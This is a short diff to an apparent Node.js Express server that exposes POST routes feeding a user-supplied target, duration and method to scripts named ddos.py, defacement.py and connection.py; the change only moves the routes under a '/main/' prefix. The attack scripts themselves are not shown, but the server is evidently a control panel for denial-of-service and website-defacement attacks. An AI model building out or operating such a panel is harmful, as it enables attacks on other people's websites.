@@ -23,8 +23,9 @@ const ddosScriptPath = path.join(__dirname, 'ddos.py');
 const defacementScriptPath = path.join(__dirname, 'defacement.py');
 const connectionScriptPath = path.join(__dirname, 'connection.py');
 
+// Ensure scripts exist before defining routes
 if (fs.existsSync(ddosScriptPath)) {
-    app.post('/ddos', (req, res) => {
+    app.post('/main/ddos', (req, res) => {
         const target = req.body.target;
         const time = req.body.time;
         const method = req.body.method;
@@ -49,7 +50,7 @@ if (fs.existsSync(ddosScriptPath)) {
 }
 
 if (fs.existsSync(defacementScriptPath)) {
-    app.post('/defacement', (req, res) => {
+    app.post('/main/defacement', (req, res) => {
         const target = req.body.target;
         const imageUrl = req.body.imageUrl;
 
@@ -68,7 +69,7 @@ if (fs.existsSync(defacementScriptPath)) {
 }
 
 if (fs.existsSync(connectionScriptPath)) {
-    app.post('/connection', (req, res) => {
+    app.post('/main/connection', (req, res) => {
         const target = req.body.target;
         const port = req.body.port;
 
